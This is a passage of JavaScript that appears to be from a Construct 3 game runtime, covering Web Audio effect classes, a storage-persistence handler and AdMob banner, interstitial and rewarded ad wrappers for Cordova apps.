                value / 1e3,
                ramp,
                time
              );
            break;
          case 7:
            (this._params[2] = value),
              this.SetAudioParam(this._oscNode.frequency, value, ramp, time);
            break;
          case 8:
            (this._params[3] = value / 100),
              this.SetAudioParam(
                this._feedbackNode.gain,
                value / 100,
                ramp,
                time
              );
        }
      }
    }),
    (self.C3AudioPhaserFX = class C3AudioPhaserFX extends AudioFXBase {
      constructor(audioDomHandler, freq, detune, q, modulation, modfreq, mix) {
        super(audioDomHandler),
          (this._type = 'phaser'),
          (this._params = [freq, detune, q, modulation, modfreq, mix]),
          (this._inputNode = this.CreateGain()),
          (this._dryNode = this.CreateGain()),
          (this._dryNode.gain.value = 1 - mix / 2),
          (this._wetNode = this.CreateGain()),
          (this._wetNode.gain.value = mix / 2),
          (this._filterNode = this._audioContext.createBiquadFilter()),
          (this._filterNode.type = 'allpass'),
          (this._filterNode.frequency.value = freq),
          (this._filterNode.detune.value = detune),
          (this._filterNode.Q.value = q),
          (this._oscNode = this._audioContext.createOscillator()),
          (this._oscNode.frequency.value = modfreq),
          (this._oscGainNode = this.CreateGain()),
          (this._oscGainNode.gain.value = modulation),
          this._inputNode.connect(this._filterNode),
          this._inputNode.connect(this._dryNode),
          this._filterNode.connect(this._wetNode),
          this._oscNode.connect(this._oscGainNode),
          this._oscGainNode.connect(this._filterNode.frequency),
          this._oscNode.start(0);
      }
      Release() {
        this._oscNode.stop(0),
          this._inputNode.disconnect(),
          this._filterNode.disconnect(),
          this._oscNode.disconnect(),
          this._oscGainNode.disconnect(),
          this._dryNode.disconnect(),
          this._wetNode.disconnect(),
          super.Release();
      }
      ConnectTo(node) {
        this._wetNode.disconnect(),
          this._wetNode.connect(node),
          this._dryNode.disconnect(),
          this._dryNode.connect(node);
      }
      GetInputNode() {
        return this._inputNode;
      }
      SetParam(param, value, ramp, time) {
        switch (param) {
          case 0:
            (value = Math.max(Math.min(value / 100, 1), 0)),
              (this._params[5] = value),
              this.SetAudioParam(this._wetNode.gain, value / 2, ramp, time),
              this.SetAudioParam(this._dryNode.gain, 1 - value / 2, ramp, time);
            break;
          case 1:
            (this._params[0] = value),
              this.SetAudioParam(this._filterNode.frequency, value, ramp, time);
            break;
          case 2:
            (this._params[1] = value),
              this.SetAudioParam(this._filterNode.detune, value, ramp, time);
            break;
          case 3:
            (this._params[2] = value),
              this.SetAudioParam(this._filterNode.Q, value, ramp, time);
            break;
          case 6:
            (this._params[3] = value),
              this.SetAudioParam(this._oscGainNode.gain, value, ramp, time);
            break;
          case 7:
            (this._params[4] = value),
              this.SetAudioParam(this._oscNode.frequency, value, ramp, time);
        }
      }
    }),
    (self.C3AudioGainFX = class C3AudioGainFX extends AudioFXBase {
      constructor(audioDomHandler, g) {
        super(audioDomHandler),
          (this._type = 'gain'),
          (this._params = [g]),
          (this._node = this.CreateGain()),
          (this._node.gain.value = g);
      }
      Release() {
        this._node.disconnect(), super.Release();
      }
      ConnectTo(node) {
        this._node.disconnect(), this._node.connect(node);
      }
      GetInputNode() {
        return this._node;
      }
      SetParam(param, value, ramp, time) {
        const DbToLinear = self.AudioDOMHandler.DbToLinear;
        if (4 === param)
          (this._params[0] = DbToLinear(value)),
            this.SetAudioParam(this._node.gain, DbToLinear(value), ramp, time);
      }
    }),
    (self.C3AudioStereoPanFX = class C3AudioStereoPanFX extends AudioFXBase {
      constructor(audioDomHandler, p) {
        super(audioDomHandler),
          (this._type = 'stereopan'),
          (this._params = [p]),
          (this._node = this._audioContext.createStereoPanner()),
          (this._node.pan.value = p);
      }
      Release() {
        this._node.disconnect(), super.Release();
      }
      ConnectTo(node) {
        this._node.disconnect(), this._node.connect(node);
      }
      GetInputNode() {
        return this._node;
      }
      SetParam(param, value, ramp, time) {
        if (((value = Math.min(Math.max(value / 100, -1), 1)), 9 === param))
          (this._params[0] = value),
            this.SetAudioParam(this._node.pan, value, ramp, time);
      }
    }),
    (self.C3AudioTremoloFX = class C3AudioTremoloFX extends AudioFXBase {
      constructor(audioDomHandler, freq, mix) {
        super(audioDomHandler),
          (this._type = 'tremolo'),
          (this._params = [freq, mix]),
          (this._node = this.CreateGain()),
          (this._node.gain.value = 1 - mix / 2),
          (this._oscNode = this._audioContext.createOscillator()),
          (this._oscNode.frequency.value = freq),
          (this._oscGainNode = this.CreateGain()),
          (this._oscGainNode.gain.value = mix / 2),
          this._oscNode.connect(this._oscGainNode),
          this._oscGainNode.connect(this._node.gain),
          this._oscNode.start(0);
      }
      Release() {
        this._oscNode.stop(0),
          this._oscNode.disconnect(),
          this._oscGainNode.disconnect(),
          this._node.disconnect(),
          super.Release();
      }
      ConnectTo(node) {
        this._node.disconnect(), this._node.connect(node);
      }
      GetInputNode() {
        return this._node;
      }
      SetParam(param, value, ramp, time) {
        switch (param) {
          case 0:
            (value = Math.max(Math.min(value / 100, 1), 0)),
              (this._params[1] = value),
              this.SetAudioParam(this._node.gain, 1 - value / 2, ramp, time),
              this.SetAudioParam(this._oscGainNode.gain, value / 2, ramp, time);
            break;
          case 7:
            (this._params[0] = value),
              this.SetAudioParam(this._oscNode.frequency, value, ramp, time);
        }
      }
    }),
    (self.C3AudioRingModFX = class C3AudioRingModFX extends AudioFXBase {
      constructor(audioDomHandler, freq, mix) {
        super(audioDomHandler),
          (this._type = 'ringmod'),
          (this._params = [freq, mix]),
          (this._inputNode = this.CreateGain()),
          (this._wetNode = this.CreateGain()),
          (this._wetNode.gain.value = mix),
          (this._dryNode = this.CreateGain()),
          (this._dryNode.gain.value = 1 - mix),
          (this._ringNode = this.CreateGain()),
          (this._ringNode.gain.value = 0),
          (this._oscNode = this._audioContext.createOscillator()),
          (this._oscNode.frequency.value = freq),
          this._oscNode.connect(this._ringNode.gain),
          this._oscNode.start(0),
          this._inputNode.connect(this._ringNode),
          this._inputNode.connect(this._dryNode),
          this._ringNode.connect(this._wetNode);
      }
      Release() {
        this._oscNode.stop(0),
          this._oscNode.disconnect(),
          this._ringNode.disconnect(),
          this._inputNode.disconnect(),
          this._wetNode.disconnect(),
          this._dryNode.disconnect(),
          super.Release();
      }
      ConnectTo(node) {
        this._wetNode.disconnect(),
          this._wetNode.connect(node),
          this._dryNode.disconnect(),
          this._dryNode.connect(node);
      }
      GetInputNode() {
        return this._inputNode;
      }
      SetParam(param, value, ramp, time) {
        switch (param) {
          case 0:
            (value = Math.max(Math.min(value / 100, 1), 0)),
              (this._params[1] = value),
              this.SetAudioParam(this._wetNode.gain, value, ramp, time),
              this.SetAudioParam(this._dryNode.gain, 1 - value, ramp, time);
            break;
          case 7:
            (this._params[0] = value),
              this.SetAudioParam(this._oscNode.frequency, value, ramp, time);
        }
      }
    }),
    (self.C3AudioDistortionFX = class C3AudioDistortionFX extends AudioFXBase {
      constructor(
        audioDomHandler,
        threshold,
        headroom,
        drive,
        makeupgain,
        mix
      ) {
        super(audioDomHandler),
          (this._type = 'distortion'),
          (this._params = [threshold, headroom, drive, makeupgain, mix]),
          (this._inputNode = this.CreateGain()),
          (this._preGain = this.CreateGain()),
          (this._postGain = this.CreateGain()),
          this._SetDrive(drive, makeupgain),
          (this._wetNode = this.CreateGain()),
          (this._wetNode.gain.value = mix),
          (this._dryNode = this.CreateGain()),
          (this._dryNode.gain.value = 1 - mix),
          (this._waveShaper = this._audioContext.createWaveShaper()),
          (this._curve = new Float32Array(65536)),
          this._GenerateColortouchCurve(threshold, headroom),
          (this._waveShaper.curve = this._curve),
          this._inputNode.connect(this._preGain),
          this._inputNode.connect(this._dryNode),
          this._preGain.connect(this._waveShaper),
          this._waveShaper.connect(this._postGain),
          this._postGain.connect(this._wetNode);
      }
      Release() {
        this._inputNode.disconnect(),
          this._preGain.disconnect(),
          this._waveShaper.disconnect(),
          this._postGain.disconnect(),
          this._wetNode.disconnect(),
          this._dryNode.disconnect(),
          super.Release();
      }
      _SetDrive(drive, makeupgain) {
        drive < 0.01 && (drive = 0.01),
          (this._preGain.gain.value = drive),
          (this._postGain.gain.value = Math.pow(1 / drive, 0.6) * makeupgain);
      }
      _GenerateColortouchCurve(threshold, headroom) {
        const n2 = 32768;
        for (let i = 0; i < n2; ++i) {
          let x = i / n2;
          (x = this._Shape(x, threshold, headroom)),
            (this._curve[n2 + i] = x),
            (this._curve[n2 - i - 1] = -x);
        }
      }
      _Shape(x, threshold, headroom) {
        const kk = 1.05 * headroom * threshold - threshold,
          sign = x < 0 ? -1 : 1,
          absx = x < 0 ? -x : x;
        let shapedInput =
          absx < threshold
            ? absx
            : threshold +
              kk * self.AudioDOMHandler.e4(absx - threshold, 1 / kk);
        return (shapedInput *= sign), shapedInput;
      }
      ConnectTo(node) {
        this._wetNode.disconnect(),
          this._wetNode.connect(node),
          this._dryNode.disconnect(),
          this._dryNode.connect(node);
      }
      GetInputNode() {
        return this._inputNode;
      }
      SetParam(param, value, ramp, time) {
        if (0 === param)
          (value = Math.max(Math.min(value / 100, 1), 0)),
            (this._params[4] = value),
            this.SetAudioParam(this._wetNode.gain, value, ramp, time),
            this.SetAudioParam(this._dryNode.gain, 1 - value, ramp, time);
      }
    }),
    (self.C3AudioCompressorFX = class C3AudioCompressorFX extends AudioFXBase {
      constructor(audioDomHandler, threshold, knee, ratio, attack, release) {
        super(audioDomHandler),
          (this._type = 'compressor'),
          (this._params = [threshold, knee, ratio, attack, release]),
          (this._node = this._audioContext.createDynamicsCompressor()),
          (this._node.threshold.value = threshold),
          (this._node.knee.value = knee),
          (this._node.ratio.value = ratio),
          (this._node.attack.value = attack),
          (this._node.release.value = release);
      }
      Release() {
        this._node.disconnect(), super.Release();
      }
      ConnectTo(node) {
        this._node.disconnect(), this._node.connect(node);
      }
      GetInputNode() {
        return this._node;
      }
      SetParam(param, value, ramp, time) {}
    }),
    (self.C3AudioAnalyserFX = class C3AudioAnalyserFX extends AudioFXBase {
      constructor(audioDomHandler, fftSize, smoothing) {
        super(audioDomHandler),
          (this._type = 'analyser'),
          (this._params = [fftSize, smoothing]),
          (this._node = this._audioContext.createAnalyser()),
          (this._node.fftSize = fftSize),
          (this._node.smoothingTimeConstant = smoothing),
          (this._freqBins = new Float32Array(this._node.frequencyBinCount)),
          (this._signal = new Uint8Array(fftSize)),
          (this._peak = 0),
          (this._rms = 0),
          this._audioDomHandler._AddAnalyser(this);
      }
      Release() {
        this._audioDomHandler._RemoveAnalyser(this),
          this._node.disconnect(),
          super.Release();
      }
      Tick() {
        this._node.getFloatFrequencyData(this._freqBins),
          this._node.getByteTimeDomainData(this._signal);
        const fftSize = this._node.fftSize;
        this._peak = 0;
        let rmsSquaredSum = 0;
        for (let i = 0; i < fftSize; ++i) {
          let s = (this._signal[i] - 128) / 128;
          s < 0 && (s = -s),
            this._peak < s && (this._peak = s),
            (rmsSquaredSum += s * s);
        }
        const LinearToDb = self.AudioDOMHandler.LinearToDb;
        (this._peak = LinearToDb(this._peak)),
          (this._rms = LinearToDb(Math.sqrt(rmsSquaredSum / fftSize)));
      }
      ConnectTo(node) {
        this._node.disconnect(), this._node.connect(node);
      }
      GetInputNode() {
        return this._node;
      }
      SetParam(param, value, ramp, time) {}
      GetData() {
        return {
          tag: this.GetTag(),
          index: this.GetIndex(),
          peak: this._peak,
          rms: this._rms,
          binCount: this._node.frequencyBinCount,
          freqBins: this._freqBins,
        };
      }
    });
}
{
  const DOM_COMPONENT_ID = 'localstorage',
    HANDLER_CLASS = class LocalStorageDOMHandler extends self.DOMHandler {
      constructor(iRuntime) {
        super(iRuntime, DOM_COMPONENT_ID),
          this.AddRuntimeMessageHandlers([
            ['init', () => this._Init()],
            ['request-persistent', () => this._OnRequestPersistent()],
          ]);
      }
      async _Init() {
        let isPersistent = !1;
        try {
          isPersistent = await navigator.storage.persisted();
        } catch (err) {
          (isPersistent = !1),
            console.warn(
              '[Construct] Error checking storage persisted state: ',
              err
            );
        }
        return { isPersistent: isPersistent };
      }
      async _OnRequestPersistent() {
        try {
          return { isOk: !0, isPersistent: await navigator.storage.persist() };
        } catch (err) {
          return (
            console.error(
              '[Construct] Error requesting persistent storage: ',
              err
            ),
            { isOk: !1 }
          );
        }
      }
    };
  self.RuntimeInterface.AddDOMHandlerClass(HANDLER_CLASS);
}
{
  const admobConfiguration = {};
  let configureOptions = null,
    startPromise = null;
  const testAdUnitsiOS = {
      banner: 'ca-app-pub-3940256099942544/2934735716',
      interstitial: 'ca-app-pub-3940256099942544/4411468910',
      rewarded: 'ca-app-pub-3940256099942544/1712485313',
      rewardedInterstitial: 'ca-app-pub-3940256099942544/6978759866',
    },
    MOBILE_ADS_INITIALIZATION_TIMEOUT_MS = 5e3;
  let idfaAvailable = !1;
  function Success(callback, message) {
    callback(null, message);
  }
  function Failure(callback, message) {
    callback(message, null);
  }
  function UpdateAdmobPlusRequest(requestProperty, propertyValue) {
    (admobConfiguration[requestProperty] = propertyValue),
      self.admob.configRequest(admobConfiguration);
  }
  async function StartAdmobPlus(resolver, debug) {
    return (
      (debug = void 0 !== debug ? debug : configureOptions.debug),
      startPromise ||
        ((startPromise = new Promise((resolve, reject) => {
          document.addEventListener('deviceready', async () => {
            try {
              const timeoutId = setTimeout(() => {
                resolve(!1), Failure(resolver, 'failure to initialize');
              }, MOBILE_ADS_INITIALIZATION_TIMEOUT_MS);
              if ((await self.admob.start(), clearTimeout(timeoutId), debug)) {
                UpdateAdmobPlusRequest('testDeviceIds', [await TestId()]);
              }
              resolve(!0);
            } catch (error) {
              resolve(!1), Failure(resolver, 'Initialization failure');
            }
          });
        })),
        startPromise)
    );
  }
  function HasInitConfigurationOptions() {
    return !!configureOptions;
  }
  function SetInitConfigureOptions(
    id,
    pubID,
    privacyPolicy,
    showFree,
    showConsent,
    debug,
    debugLocation
  ) {
    configureOptions ||
      ((configureOptions = {
        id: id,
        pubID: pubID,
        privacyPolicy: privacyPolicy,
        showFree: showFree,
        showConsent: showConsent,
        debug: debug,
        debugLocation: debugLocation,
      }),
      Object.freeze(configureOptions));
  }
  async function TestId() {
    if ('android' === self.cordova.platformId)
      return self.C3AdUtilsMD5(self.device.uuid).toUpperCase();
    if ('ios' === self.cordova.platformId) {
      const idfaPlugin = self.cordova.plugins.idfa,
        idfaInfo = await idfaPlugin.getInfo();
      if (!idfaInfo.trackingLimited)
        return (
          (idfaAvailable = !0), self.C3AdUtilsMD5(idfaInfo.idfa).toUpperCase()
        );
    }
  }
  function GetAdUnit(adUnit, type) {
    if ('android' === self.cordova.platformId) return adUnit;
    if ('ios' === self.cordova.platformId) {
      const hasTestAdUnit = !!testAdUnitsiOS[type];
      return configureOptions.debug && !idfaAvailable && hasTestAdUnit
        ? (console.log('[C3 advert]', 'USING TEST AD UNITS'),
          testAdUnitsiOS[type])
        : adUnit;
    }
  }
  self.C3AdUtils = {
    Success: Success,
    Failure: Failure,
    StartAdmobPlus: StartAdmobPlus,
    UpdateAdmobPlusRequest: UpdateAdmobPlusRequest,
    SetInitConfigureOptions: SetInitConfigureOptions,
    HasInitConfigurationOptions: HasInitConfigurationOptions,
    GetAdUnit: GetAdUnit,
    get ConfigurationOptions() {
      return configureOptions;
    },
    get TestId() {
      return TestId();
    },
  };
}
{
  const C3AdUtils = self.C3AdUtils,
    Success = C3AdUtils.Success,
    Failure = C3AdUtils.Failure,
    BANNER = 0,
    LARGE_BANNER = 1,
    MEDIUM_RECTANGLE = 2,
    FULL_BANNER = 3,
    LEADERBOARD = 4,
    SMART_BANNER = 5,
    Events = {
      get LOAD() {
        return self.admob.Events.bannerLoad;
      },
      get LOAD_FAIL() {
        return self.admob.Events.bannerLoadFail;
      },
    };
  class C3BannerAd {
    constructor(id, size, position, resolver) {
      if (!id) return Failure(resolver, 'Unit ID not specified');
      if (!size) return Failure(resolver, 'Ad size not specified');
      if (!position) return Failure(resolver, 'Ad position not specified');
      switch (
        ((this._adUnitId = id),
        (this._position = position),
        (this._size = ''),
        size)
      ) {
        case 'portrait':
        case 'landscape':
        default:
          this._size = SMART_BANNER;
          break;
        case 'standard':
          this._size = BANNER;
          break;
        case 'large':
          this._size = LARGE_BANNER;
          break;
        case 'medium':
          this._size = MEDIUM_RECTANGLE;
          break;
        case 'full':
          this._size = FULL_BANNER;
          break;
        case 'leaderboard':
          this._size = LEADERBOARD;
      }
      (this._ad = null),
        (this._adLoading = !1),
        (this._adShowing = !1),
        (this._remove_load_listeners = null),
        (this._load_settled_promise = null),
        (this._load_settled_promise_resolver = null);
    }
    Release() {
      this._remove_load_listeners && this._remove_load_listeners(),
        (this._remove_load_listeners = null),
        (this._load_settled_promise = null),
        (this._load_settled_promise_resolver = null),
        (this._ad = null);
    }
    Load(adPersonalization, resolver) {
      if (this._ad) return Success(resolver, 'banner ad loaded');
      _AddLoadListeners.call(this, resolver);
      const options = {
        adUnitId: C3AdUtils.GetAdUnit(this._adUnitId, 'banner'),
        size: this._size,
        position: this._position,
        offset: 0,
        npa: 'NON_PERSONALIZED' === adPersonalization ? '1' : '0',
      };
      (this._ad = new self.admob.BannerAd(options)),
        (this._load_settled_promise = new Promise(
          (resolve) => (this._load_settled_promise_resolver = resolve)
        )),
        this._ad.load();
    }
    async Show(resolver) {
      return this._ad
        ? this._adLoading
          ? Failure(resolver, 'banner ad still loading')
          : this._adShowing
          ? Success(resolver, 'banner ad already shown')
          : (await this._ad.show(),
            (this._adShowing = !0),
            void Success(resolver, 'banner shown'))
        : Failure(resolver, 'banner ad not created');
    }
    async Hide(resolver) {
      return this._ad
        ? this._adLoading
          ? Failure(resolver, 'banner ad still loading')
          : this._adShowing
          ? (await this._ad.hide(),
            (this._adShowing = !1),
            void Success(resolver, 'banner ad hidden'))
          : Success(resolver, 'banner ad not being shown')
        : Failure(resolver, 'banner ad not created');
    }
    IsLoading() {
      return this._adLoading;
    }
    IsShowing() {
      return this._adShowing;
    }
    OnLoadSettled() {
      return this._load_settled_promise;
    }
  }
  function _AddLoadListeners(resolver) {
    const onLoad = (event) => {
        (this._adLoading = !1),
          Success(resolver, 'banner ad loaded'),
          document.removeEventListener(Events.LOAD, onLoad),
          document.removeEventListener(Events.LOAD_FAIL, onFailLoad),
          this._load_settled_promise_resolver &&
            this._load_settled_promise_resolver();
      },
      onFailLoad = (event) => {
        (this._ad = null),
          (this._adLoading = !1),
          Failure(resolver, 'banner ad failed to load'),
          document.removeEventListener(Events.LOAD, onLoad),
          document.removeEventListener(Events.LOAD_FAIL, onFailLoad),
          this._load_settled_promise_resolver &&
            this._load_settled_promise_resolver();
      };
    (this._remove_load_listeners = () => {
      document.removeEventListener(Events.LOAD, onLoad),
        document.removeEventListener(Events.LOAD_FAIL, onFailLoad),
        document.removeEventListener(Events.LOAD, onLoad),
        document.removeEventListener(Events.LOAD_FAIL, onFailLoad);
    }),
      document.addEventListener(Events.LOAD, onLoad),
      document.addEventListener(Events.LOAD_FAIL, onFailLoad);
  }
  self.C3BannerAd = C3BannerAd;
}
{
  const C3AdUtils = self.C3AdUtils,
    Success = C3AdUtils.Success,
    Failure = C3AdUtils.Failure,
    Events = {
      get LOAD() {
        return self.admob.Events.interstitialLoad;
      },
      get LOAD_FAIL() {
        return self.admob.Events.interstitialLoadFail;
      },
      get SHOW() {
        return self.admob.Events.interstitialShow;
      },
      get SHOW_FAIL() {
        return self.admob.Events.interstitialShowFail;
      },
      get DISMISS() {
        return self.admob.Events.interstitialDismiss;
      },
    };
  class C3InterstitialAd {
    constructor(id, resolver) {
      if (!id) return Failure(resolver, 'Unit ID not specified');
      (this._adUnitId = id),
        (this._ad = null),
        (this._adLoading = !1),
        (this._adShowing = !1),
        (this._loadSuccess = !1),
        (this._loadPromiseResolver = null),
        (this._loadPromise = this.GetLoadPromise()),
        document.addEventListener(Events.DISMISS, async (event) => {
          (this._adShowing = !1),
            (this._adLoading = !0),
            (this._loadSuccess = !1),
            (this._loadPromise = null),
            (this._loadPromise = this.GetLoadPromise()),
            _AddLoadListeners.call(this),
            self.C3MobileAdvertsAPI.real.resumeRuntime(),
            await this._ad.load();
        });
    }
    GetLoadPromise() {
      return (
        this._loadPromise ||
          (this._loadPromise = new Promise((resolve) => {
            this._loadPromiseResolver = resolve;
          })),
        this._loadPromise
      );
    }
    ResolveLoadPromise(result) {
      (this._loadSuccess = result),
        this._loadPromiseResolver && this._loadPromiseResolver(result),
        (this._loadPromise = null),
        (this._loadPromiseResolver = null),
        (this._loadPromise = this.GetLoadPromise());
    }
    Load(adPersonalization, resolver) {
      const options = {
        adUnitId: C3AdUtils.GetAdUnit(this._adUnitId, 'interstitial'),
        npa: 'NON_PERSONALIZED' === adPersonalization ? '1' : '0',
      };
      (this._adLoading = !0),
        (this._adShowing = !1),
        (this._loadSuccess = !1),
        (this._loadPromise = null),
        (this._loadPromise = this.GetLoadPromise()),
        (this._ad = new self.admob.InterstitialAd(options)),
        _AddLoadListeners.call(this, resolver),
        this._ad.load();
    }
    HandleOnLoadedResult(result, resolver) {
      result
        ? C3AdUtils.Success(resolver, 'interstitial ad load')
        : C3AdUtils.Failure(resolver, 'interstitial ad failed to load');
    }
    async Show(resolver) {
      if (!this._ad) return Failure(resolver, 'interstitial ad not created');
      if (this._adShowing)
        return Success(resolver, 'interstitial ad already shown');
      const show_ad = async () => {
        this._loadSuccess
          ? (_AddShowListeners.call(this, resolver), await this._ad.show())
          : (_AddLoadListeners.call(this),
            (this._loadSuccess = !1),
            (this._loadPromise = null),
            this._ad.load(),
            await this.GetLoadPromise(),
            this._loadSuccess
              ? (_AddShowListeners.call(this, resolver), await this._ad.show())
              : Failure(resolver, 'interstitial ad failed to load'));
      };
      this._adLoading
        ? (await this.GetLoadPromise(), await show_ad())
        : await show_ad();
    }
    IsLoading() {
      return this._adLoading;
    }
    IsShowing() {
      return this._adShowing;
    }
  }
  function _AddLoadListeners(resolver) {
    const onLoad = (event) => {
        (this._adLoading = !1),
          this.ResolveLoadPromise(!0),
          resolver && Success(resolver, 'interstitial ad load'),
          document.removeEventListener(Events.LOAD, onLoad),
          document.removeEventListener(Events.LOAD_FAIL, onFailLoad);
      },
      onFailLoad = (event) => {
        (this._adLoading = !1),
          this.ResolveLoadPromise(!1),
          resolver && Failure(resolver, 'interstitial ad failed to load'),
          document.removeEventListener(Events.LOAD, onLoad),
          document.removeEventListener(Events.LOAD_FAIL, onFailLoad);
      };
    document.addEventListener(Events.LOAD, onLoad),
      document.addEventListener(Events.LOAD_FAIL, onFailLoad);
  }
  function _AddShowListeners(resolver) {
    const onShow = (event) => {
        (this._adShowing = !0),
          self.C3MobileAdvertsAPI.real.suspendRuntime(),
          resolver && Success(resolver, 'interstitial ad show'),
          document.removeEventListener(Events.SHOW, onShow),
          document.removeEventListener(Events.SHOW_FAIL, onShowFail);
      },
      onShowFail = (event) => {
        (this._adShowing = !1),
          resolver && Failure(resolver, 'interstitial ad failed to show'),
          document.removeEventListener(Events.SHOW, onShow),
          document.removeEventListener(Events.SHOW_FAIL, onShowFail);
      };
    document.addEventListener(Events.SHOW, onShow),
      document.addEventListener(Events.SHOW_FAIL, onShowFail);
  }
  self.C3InterstitialAd = C3InterstitialAd;
}
{
  const C3AdUtils = self.C3AdUtils,
    Success = C3AdUtils.Success,
    Failure = C3AdUtils.Failure,
    Events = {
      get LOAD() {
        return self.admob.Events.rewardedLoad;
      },
      get LOAD_FAIL() {
        return self.admob.Events.rewardedLoadFail;
      },
      get SHOW() {
        return self.admob.Events.rewardedShow;
      },
      get SHOW_FAIL() {
        return self.admob.Events.rewardedShowFail;
      },
      get DISMISS() {
        return self.admob.Events.rewardedDismiss;
      },
      get REWARD() {
        return self.admob.Events.rewardedReward;
      },
    };
  class C3RewardedAd {
    constructor(id, resolver) {
      if (!id) return Failure(resolver, 'Unit ID not specified');
      (this._adUnitId = id),
        (this._ad = null),
        (this._adLoading = !1),
        (this._adShowing = !1),
        (this._loadSuccess = !1),
        (this._loadPromiseResolver = null),
        (this._loadPromise = this.GetLoadPromise()),
        (this._reward = null);
    }
    GetLoadPromise() {
      return (
        this._loadPromise ||
          (this._loadPromise = new Promise((resolve) => {
            this._loadPromiseResolver = resolve;
          })),
        this._loadPromise
      );
    }
    ResolveLoadPromise(result) {
      (this._loadSuccess = result),
        this._loadPromiseResolver && this._loadPromiseResolver(result),
        (this._loadPromise = null),
        (this._loadPromiseResolver = null),
        (this._loadPromise = this.GetLoadPromise());
    }
    Load(adPersonalization, resolver) {
      const options = {
        adUnitId: C3AdUtils.GetAdUnit(this._adUnitId, 'rewarded'),
        npa: 'NON_PERSONALIZED' === adPersonalization ? '1' : '0',
      };
      (this._adLoading = !0),
        (this._adShowing = !1),
        (this._loadSuccess = !1),
        (this._loadPromise = null),
        (this._loadPromise = this.GetLoadPromise()),
        (this._ad = new self.admob.RewardedAd(options)),
        _AddLoadListeners.call(this, resolver),
        this._ad.load();
    }
    HandleOnLoadedResult(result, resolver) {
      result
        ? C3AdUtils.Success(resolver, 'rewarded ad load')
        : C3AdUtils.Failure(resolver, 'rewarded ad failed to load');
    }
    async Show(resolver) {
      if (!this._ad) return Failure(resolver, 'rewarded ad not created');
      if (this._adShowing)
        return Success(resolver, 'rewarded ad already shown');
      const show_ad = async () => {
        this._loadSuccess
          ? (_AddShowListeners.call(this, resolver), await this._ad.show())
          : (_AddLoadListeners.call(this),
            (this._loadSuccess = !1),
            (this._loadPromise = null),
            this._ad.load(),
            await this.GetLoadPromise(),
            this._loadSuccess
              ? (_AddShowListeners.call(this, resolver), await this._ad.show())
              : Failure(resolver, 'rewarded ad failed to load'));
      };
      this._adLoading
        ? (await this.GetLoadPromise(), await show_ad())
        : await show_ad();
    }
    IsLoading() {
      return this._adLoading;
    }
    IsShowing() {
      return this._adShowing;
    }
  }
  function _AddLoadListeners(resolver) {
    const onLoad = (event) => {
        (this._adLoading = !1),
          this.ResolveLoadPromise(!0),
          resolver && Success(resolver, 'rewarded ad load'),
          document.removeEventListener(Events.LOAD, onLoad),
          document.removeEventListener(Events.LOAD_FAIL, onFailLoad);
      },
      onFailLoad = (event) => {
        (this._adLoading = !1),
          this.ResolveLoadPromise(!1),
          resolver && Failure(resolver, 'rewarded ad failed to load'),
          document.removeEventListener(Events.LOAD, onLoad),
          document.removeEventListener(Events.LOAD_FAIL, onFailLoad);
      };
    document.addEventListener(Events.LOAD, onLoad),
      document.addEventListener(Events.LOAD_FAIL, onFailLoad);
  }
  function _AddShowListeners(resolver) {
    const onShow = (event) => {
        (this._adShowing = !0), self.C3MobileAdvertsAPI.real.suspendRuntime();
      },
      onReward = (event) => {
        this._reward = event.reward;
      },
      onShowFail = (event) => {
        (this._adShowing = !1),
          resolver && Failure(resolver, 'rewarded ad failed to show'),
          document.removeEventListener(Events.SHOW, onShow),
          document.removeEventListener(Events.SHOW_FAIL, onShowFail),
          document.removeEventListener(Events.REWARD, onReward),
          document.removeEventListener(Events.DISMISS, onDismiss);
      },
      onDismiss = (event) => {
        if (null !== this._reward) {
          const type = String(this._reward.type),
            amount = String(this._reward.amount);
          resolver && Success(resolver, JSON.stringify([type, amount]));
        } else resolver && Failure(resolver, 'closed with no reward');
        (this._reward = null),
          (this._adShowing = !1),
          (this._adLoading = !0),
          (this._loadSuccess = !1),
          (this._loadPromise = null),
          (this._loadPromise = this.GetLoadPromise()),
          _AddLoadListeners.call(this),
          self.C3MobileAdvertsAPI.real.resumeRuntime(),
          this._ad.load(),
          document.removeEventListener(Events.SHOW, onShow),
          document.removeEventListener(Events.SHOW_FAIL, onShowFail),
          document.removeEventListener(Events.REWARD, onReward),
          document.removeEventListener(Events.DISMISS, onDismiss);
      };
    document.addEventListener(Events.SHOW, onShow),
      document.addEventListener(Events.SHOW_FAIL, onShowFail),
      document.addEventListener(Events.REWARD, onReward),
      document.addEventListener(Events.DISMISS, onDismiss);
  }
  self.C3RewardedAd = C3RewardedAd;
}
{
  const C3AdUtils = self.C3AdUtils,
    Success = C3AdUtils.Success,
    Failure = C3AdUtils.Failure,
    Events = {
      get LOAD() {
        return self.admob.Events.rewardedInterstitialLoad;
      },
      get LOAD_FAIL() {
        return self.admob.Events.rewardedInterstitialLoadFail;
      },
      get SHOW() {
        return self.admob.Events.rewardedInterstitialShow;
      },
      get SHOW_FAIL() {
        return self.admob.Events.rewardedInterstitialShowFail;
      },
      get DISMISS() {
        return self.admob.Events.rewardedInterstitialDismiss;
      },
      get REWARD() {
        return self.admob.Events.rewardedInterstitialReward;
      },
    };
  class C3RewardedInterstitialAd {
    constructor(id, resolver) {
      if (!id) return Failure(resolver, 'Unit ID not specified');
      (this._adUnitId = id),
        (this._ad = null),
        (this._adLoading = !1),
        (this._adShowing = !1),
        (this._loadSuccess = !1),
        (this._loadPromiseResolver = null),
        (this._loadPromise = this.GetLoadPromise()),
        (this._reward = null);
    }
    GetLoadPromise() {
      return (
        this._loadPromise ||
          (this._loadPromise = new Promise((resolve) => {
            this._loadPromiseResolver = resolve;
          })),
        this._loadPromise
      );
    }
    ResolveLoadPromise(result) {
      (this._loadSuccess = result),
        this._loadPromiseResolver && this._loadPromiseResolver(result),
        (this._loadPromise = null),
        (this._loadPromiseResolver = null),
        (this._loadPromise = this.GetLoadPromise());
    }
    Load(adPersonalization, resolver) {
      const options = {
        adUnitId: C3AdUtils.GetAdUnit(this._adUnitId, 'rewardedInterstitial'),
        npa: 'NON_PERSONALIZED' === adPersonalization ? '1' : '0',
      };
      (this._adLoading = !0),
        (this._adShowing = !1),
        (this._loadSuccess = !1),
        (this._loadPromise = null),
        (this._loadPromise = this.GetLoadPromise()),
        (this._ad = new self.admob.RewardedInterstitialAd(options)),
        _AddLoadListeners.call(this, resolver),
        this._ad.load();
    }
    HandleOnLoadedResult(result, resolver) {
      result
        ? C3AdUtils.Success(resolver, 'rewarded interstitial ad load')
        : C3AdUtils.Failure(
            resolver,
            'rewarded interstitial ad failed to load'
          );
    }
    async Show(resolver) {
      if (!this._ad)
